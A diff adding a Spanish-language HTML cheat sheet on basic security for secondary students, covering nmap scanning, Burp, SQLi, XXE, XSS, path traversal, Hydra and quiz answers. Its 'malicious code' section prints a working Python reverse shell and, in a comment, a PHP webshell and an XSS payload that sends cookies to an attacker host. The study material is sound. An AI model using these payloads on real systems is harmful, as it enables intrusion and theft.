@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>🧠 Guía de Seguridad Informática</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f4f4f4;
+      color: #333;
+    }
+    header {
+      background-color: #2c3e50;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      display: flex;
+    }
+    nav {
+      width: 250px;
+      background: #ecf0f1;
+      min-height: 100vh;
+      padding: 20px 0;
+      position: sticky;
+      top: 60px;
+    }
+    nav ul {
+      list-style: none;
+      padding: 0;
+    }
+    nav li {
+      padding: 12px 20px;
+      cursor: pointer;
+      border-bottom: 1px solid #ccc;
+    }
+    nav li:hover {
+      background: #dce3e6;
+    }
+    main {
+      padding: 20px;
+      flex-grow: 1;
+    }
+    section {
+      display: none;
+    }
+    section.active {
+      display: block;
+    }
+    h2 {
+      color: #2c3e50;
+    }
+    pre {
+      background: #272822;
+      color: #fff;
+      padding: 10px;
+      border-radius: 5px;
+      overflow-x: auto;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 20px;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background: #34495e;
+      color: white;
+    }
+    .accordion {
+      background-color: #2980b9;
+      color: white;
+      cursor: pointer;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      text-align: left;
+      outline: none;
+      transition: 0.4s;
+      margin-top: 10px;
+    }
+    .panel {
+      padding: 0 18px;
+      display: none;
+      overflow: hidden;
+      background-color: white;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>🧠 Guía de Seguridad Informática Básica</h1>
+  <p>Para estudiantes de secundaria y principiantes</p>
+</header>
+
+<div class="container">
+  <nav>
+    <ul>
+      <li onclick="showSection('redes')">🔍 Redes y Escaneo</li>
+      <li onclick="showSection('nmap')">🛠️ NMAP</li>
+      <li onclick="showSection('burp')">🔒 BurpSuite</li>
+      <li onclick="showSection('ataques')">🔐 Ataques Web</li>
+      <li onclick="showSection('herramientas')">🔥 Herramientas</li>
+      <li onclick="showSection('codigos')">🧾 Códigos Maliciosos</li>
+      <li onclick="showSection('respuestas')">📋 Respuestas Correctas</li>
+    </ul>
+  </nav>
+
+  <main>
+    <section id="redes" class="active">
+      <h2>Redes y Escaneo de Redes</h2>
+      <p><strong>Host Discovery:</strong> Descubrir qué dispositivos están activos en una red.</p>
+      <pre>sudo nmap -sn 192.168.56.0/24</pre>
+      <pre>sudo arp-scan --interface=eth0 --localnet</pre>
+      <p><strong>/24:</strong> 24 bits para la red → 8 bits para hosts → 256 IPs posibles</p>
+    </section>
+
+    <section id="nmap">
+      <h2>NMAP – Network Mapper</h2>
+      <table>
+        <tr><th>Comando</th><th>Tipo de escaneo</th></tr>
+        <tr><td>-sT</td><td>TCP Connect Scan</td></tr>
+        <tr><td>-sS</td><td>SYN Scan</td></tr>
+        <tr><td>-sU</td><td>UDP Scan</td></tr>
+        <tr><td>-sV</td><td>Detección de versión</td></tr>
+        <tr><td>-O</td><td>Detección de sistema operativo</td></tr>
+        <tr><td>-p</td><td>Especificar puertos</td></tr>
+        <tr><td>-Pn</td><td>Saltar host discovery</td></tr>
+      </table>
+    </section>
+
+    <section id="burp">
+      <h2>BurpSuite</h2>
+      <p>Herramienta de proxy web para interceptar peticiones HTTP/S y realizar análisis de seguridad.</p>
+    </section>
+
+    <section id="ataques">
+      <h2>Ataques Web Más Comunes</h2>
+
+      <button class="accordion">🕵️‍♂️ SQLi – Inyección SQL</button>
+      <div class="panel">
+        <p>Inyectar código SQL malicioso para manipular consultas de base de datos.</p>
+        <pre>' OR '1'='1</pre>
+      </div>
+
+      <button class="accordion">🧬 XXE – XML External Entity Injection</button>
+      <div class="panel">
+        <p>Leer archivos locales mediante entidades XML.</p>
+        <pre><?xml version="1.0"?><br><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></pre>
+      </div>
+
+      <button class="accordion">🧨 XSS – Cross-Site Scripting</button>
+      <div class="panel">
+        <p>Inyectar JavaScript malicioso en páginas web.</p>
+        <pre><script>alert('XSS')</script></pre>
+      </div>
+
+      <button class="accordion">📁 Path Traversal / LFI</button>
+      <div class="panel">
+        <p>Acceder a archivos sensibles usando ../</p>
+        <pre>http://example.com/page.php?page=../../etc/passwd</pre>
+      </div>
+    </section>
+
+    <section id="herramientas">
+      <h2>Herramientas de Ataque</h2>
+      <h3>🚀 Hydra – Ataques de fuerza bruta</h3>
+      <pre>hydra -l admin -P passwords.txt ssh://192.168.1.10</pre>
+      <h3>🧨 Burp Intruder</h3>
+      <p>Usado para ataques de fuerza bruta o fuzzing en aplicaciones web.</p>
+    </section>
+
+    <section id="codigos">
+      <h2>Códigos Maliciosos Comunes</h2>
+      <h3>🐍 Reverse Shell en Python:</h3>
+      <pre>
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.44",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+      </pre>
+      <h3>🐞 Webshell en PHP:</h3>
+     <!-- <pre><?php system($_GET['cmd']); ?></pre>   
+      <h3>🧲 Payload XSS:</h3>
+      <pre><script>document.location='http://atacante.com/log?c='+document.cookie</script></pre>  -->
+    </section>
+
+    <section id="respuestas">
+      <h2>Resumen de Respuestas Correctas</h2>
+      <table>
+        <tr><th>Pregunta</th><th>Respuesta</th><th>Explicación</th></tr>
+        <tr><td>/24</td><td>Bits de red → calcular hosts</td><td>/24 = 256 direcciones totales</td></tr>
+        <tr><td>Listar permisos en Linux</td><td>ls -l</td><td>Muestra detalles de archivos y permisos</td></tr>
+        <tr><td>Host Discovery en 192.168.56.0/24</td><td>sudo nmap -sn 192.168.56.0/24</td><td>Mejor forma de hacer ping scan</td></tr>
+        <tr><td>Puerto responde con RST</td><td>Puerto cerrado</td><td>RST indica rechazo de conexión</td></tr>
+        <tr><td>NMAP pertenece a</td><td>Reconocimiento Activo</td><td>Envía paquetes directamente</td></tr>
+        <tr><td>Escaneo TCP sin host discovery</td><td>sudo nmap -sT $ip -Pn -p...</td><td>Para saltarse ping scan</td></tr>
+        <tr><td>Reconocimiento activo</td><td>Host discovery, escaneo de puertos, escaneo avanzado</td><td>Interacción directa con objetivo</td></tr>
+        <tr><td>Comando arp-scan correcto</td><td>sudo arp-scan -I eth1 -l</td><td>Interfaz conectada a red objetivo</td></tr>
+        <tr><td>Flag host discovery en NMAP</td><td>-sn</td><td>Sin escaneo de puertos</td></tr>
+        <tr><td>Flag escaneo desde lista en NMAP</td><td>-iL</td><td>Leer desde archivo</td></tr>
+        <tr><td>Escaneo SYN sin privilegios</td><td>No podrá ejecutarse</td><td>Necesita root/sudo</td></tr>
+        <tr><td>Ataque en payload productId=&xxe;</td><td>XXE</td><td>Entidad externa leyendo archivo</td></tr>
+        <tr><td>Código PHP system($_GET['cmd'])</td><td>Permite ejecutar comandos</td><td>Command injection</td></tr>
+        <tr><td>Payload id=10' OR 1=1--</td><td>SQLi</td><td>Manipulación de consulta SQL</td></tr>
+        <tr><td>Script img.src=...</td><td>XSS</td><td>Inyección de script</td></tr>
+        <tr><td>Path Traversal vs LFI</td><td>No son lo mismo, pero relacionados</td><td>Path traversal es técnica, LFI es vulnerabilidad</td></tr>
+      </table>
+    </section>
+  </main>
+</div>
+
+<script>
+  function showSection(id) {
+    document.querySelectorAll("section").forEach(sec => sec.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+  }
+
+  // Acordeón
+  var acc = document.getElementsByClassName("accordion");
+  for (var i = 0; i < acc.length; i++) {
+    acc[i].addEventListener("click", function() {
+      this.classList.toggle("active");
+      var panel = this.nextElementSibling;
+      if (panel.style.display === "block") {
+        panel.style.display = "none";
+      } else {
+        panel.style.display = "block";
+      }
+    });
+  }
+</script>
+
+</body>
+</html>
